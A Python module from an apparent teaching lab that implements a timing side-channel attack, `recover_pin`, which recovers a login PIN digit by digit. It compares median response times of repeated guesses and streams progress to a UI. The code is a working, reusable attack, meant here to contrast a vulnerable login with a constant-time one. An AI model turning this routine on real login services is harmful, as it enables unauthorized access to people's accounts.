"""Timing attack against the lab's login check.

The backend (backend/app/attacks.py) already calls ``recover_pin`` from a
background thread when the UI presses "Start attack", and shows whatever
it reports.

What the backend gives you
--------------------------
``probe(guess) -> ProbeResult``
    Sends one guess to the selected login (vulnerable or constant-time) of
    the session being attacked and returns how long it took in
    microseconds, plus whether the server accepted it. If a countermeasure
    refuses the guess (lockout 423, rate limit 429) the probe raises
    ``ProbeBlocked``; let it propagate and the backend marks the job failed.

What the backend expects back
-----------------------------
* Call ``on_sample(total_requests, recovered_so_far, medians_us)`` as you
  collect timings, so the live bar chart updates. ``medians_us`` maps each
  candidate character (e.g. "0".."9") to its current median time.
* Call ``on_position(PositionReport(...))`` each time you lock in a digit.
* Check ``should_stop()`` often and return ``None`` if it is true.
* Return a ``RecoveryResult`` when done. Set ``found_by_success=True`` if a
  probe came back with ``success=True`` (the backend then skips its own
  confirmation login).
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Callable, Optional

from .stats import median_time, best_candidate, confidence as _confidence


class ProbeBlocked(Exception):
    """Raised by a probe when a countermeasure (rate limit, lockout) refuses it."""

    def __init__(self, status_code: int, reason: str) -> None:
        super().__init__(reason)
        self.status_code = status_code
        self.reason = reason


@dataclass
class ProbeResult:
    elapsed_us: float
    success: bool


Probe = Callable[[str], ProbeResult]


@dataclass
class PositionReport:
    position: int              # zero-based index of the digit just locked in
    recovered_so_far: str      # all digits locked in so far, including this one
    medians_us: dict[str, float]
    chosen: str                # the digit picked for this position
    confidence: float          # your own score; use float("inf") if certain


@dataclass
class RecoveryResult:
    recovered: str
    found_by_success: bool
    total_requests: int
    positions: list[PositionReport]


def recover_pin(
    probe: Probe,
    length: int,
    charset: str = "0123456789",
    samples: int = 15,
    on_position: Optional[Callable[[PositionReport], None]] = None,
    on_sample: Optional[Callable[[int, str, dict[str, float]], None]] = None,
    should_stop: Callable[[], bool] = lambda: False,
) -> Optional[RecoveryResult]:
    """Recover the PIN using only ``probe`` timings. Returns ``None`` if stopped."""
    recovered = ""
    total_requests = 0
    positions: list[PositionReport] = []
    filler = charset[0]

    for position in range(length):
        if should_stop():
            return None

        medians_us: dict[str, float] = {}

        for candidate in charset:
            if should_stop():
                return None

            pad_len = length - len(recovered) - 1
            guess = recovered + candidate + (filler * pad_len)

            timings: list[float] = []
            for _ in range(samples):
                if should_stop():
                    return None

                result = probe(guess)  # ProbeBlocked propagates on purpose
                total_requests += 1
                timings.append(result.elapsed_us)

                if result.success:
                    return RecoveryResult(
                        recovered=guess,
                        found_by_success=True,
                        total_requests=total_requests,
                        positions=positions,
                    )

            medians_us[candidate] = median_time(timings)

            if on_sample:
                on_sample(total_requests, recovered, dict(medians_us))

        chosen = best_candidate(medians_us)
        recovered += chosen

        report = PositionReport(
            position=position,
            recovered_so_far=recovered,
            medians_us=medians_us,
            chosen=chosen,
            confidence=_confidence(medians_us),
        )
        positions.append(report)

        if on_position:
            on_position(report)

    return RecoveryResult(
        recovered=recovered,
        found_by_success=False,
        total_requests=total_requests,
        positions=positions,
    )